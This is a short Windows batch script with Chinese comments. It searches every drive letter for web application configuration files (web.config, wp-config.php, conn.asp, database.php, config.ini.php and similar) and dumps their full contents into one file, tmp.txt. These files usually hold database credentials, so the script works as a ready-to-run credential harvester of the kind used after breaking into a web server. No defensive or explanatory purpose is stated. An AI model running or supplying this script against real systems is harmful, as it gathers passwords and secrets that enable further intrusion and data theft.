@echo off
goto :main
这是注释：(for /f "delims="的作用为取消默认的以空格等符号作为分割符
dir /s 实现了linux中的find功能，for /r path %%i in (web.conf?g) do ... 也可以实现find功能，但是自己实现时发现for /r path ...中的path只能是一个具
体路径，不能是变量，这样就不能遍历全部磁盘了)
:main
set str=c d e f g h i j k l m n o p q r s t u v w x y z 
echo  当前硬盘的分区有： 
for %%i in (%str%) do (
if exist %%i: (echo %%i:
for /f "delims=" %%j in ('dir /b /s %%i:\web.conf?g %%i:\global.a?a %%i:\wp-config.p?p %%i:\setting.p?p %%i:\database.p?p %%i:\config.p?p %%i:
\config.ini.p?p %%i:\conn.p?p %%i:\connect.p?p %%i:\conn.a?p %%i:\conn.a?a') do (
echo *****filepath***** >> tmp.txt
echo %%j >> tmp.txt
type "%%j" >> tmp.txt
echo. >> tmp.txt
echo ---------------------------- >> tmp.txt
echo 我是美丽的分割线 >> tmp.txt
echo ---------------------------- >> tmp.txt
echo. >> tmp.txt
)
)
)
